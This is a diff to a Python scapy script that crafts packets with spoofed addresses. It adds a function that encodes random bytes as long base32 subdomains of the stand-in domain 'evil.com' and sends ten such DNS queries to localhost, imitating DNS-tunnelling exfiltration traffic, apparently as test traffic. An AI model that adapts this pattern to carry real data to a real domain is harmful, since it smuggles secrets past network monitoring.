@@ -2,6 +2,7 @@ from scapy.layers.inet import IP, TCP, UDP, ICMP
 from scapy.layers.l2 import Ether, ARP
 from scapy.layers.dns import DNS, DNSQR
 from scapy.sendrecv import send, sendp
+import base64, os
 
 def send_packet(protocol, dst_ip, src_ip=None, src_port=None, dst_port=None,
                 src_mac=None, dst_mac=None, flags=None, payload=None, 
@@ -13,7 +14,7 @@ def send_packet(protocol, dst_ip, src_ip=None, src_port=None, dst_port=None,
     
     if protocol == "DNS":
         if payload:
-            safe_payload = payload.decode('utf-8').replace(" ", "-") + ".com"
+            safe_payload = payload.decode('utf-8').replace(" ", "-")
         
         dns_layer = DNS(rd=1, qd=DNSQR(qname=safe_payload))
         
@@ -86,22 +87,29 @@ def send_packet(protocol, dst_ip, src_ip=None, src_port=None, dst_port=None,
     else:
         raise ValueError(f"Unsupported protocol: {protocol}")
     
+def make_tunnel_domain(base_domain="evil.com"):  # already a full domain
+    raw = os.urandom(50)
+    encoded = base64.b32encode(raw).decode().rstrip("=").lower()
+    labels = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
+    return (".".join(labels) + "." + base_domain).encode()
+
 def main():
     protocol = "DNS"
-    dst_ip = "137.238.221.54"
+    dst_ip = "127.0.0.1"
     src_ip = "192.168.1.2"
     src_port = 12345
     dst_port = 53
     src_mac = "56:1A:7D:3F:4B:6C"
     dst_mac = "41:1A:7D:3F:4B:6C"
     flags = None
-    payload = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6".encode()
+    #payload = "4a6f686e20446f6520776173206865726520616e6420646964207468696e6773".encode()
     num_packets = 1
     
-    send_packet(protocol, dst_ip, src_ip, src_port, dst_port, src_mac, dst_mac, flags, payload, num_packets)
+    # In main():
+    for i in range(10):
+        payload = make_tunnel_domain()
+        send_packet("DNS", dst_ip, src_ip, src_port, dst_port,
+                    src_mac, dst_mac, flags, payload, 1)
     
-    for port in range(20):
-        send_packet(protocol, dst_ip, src_ip, src_port, dst_port, src_mac, dst_mac, flags, payload, num_packets)
-        pass
 
 main()
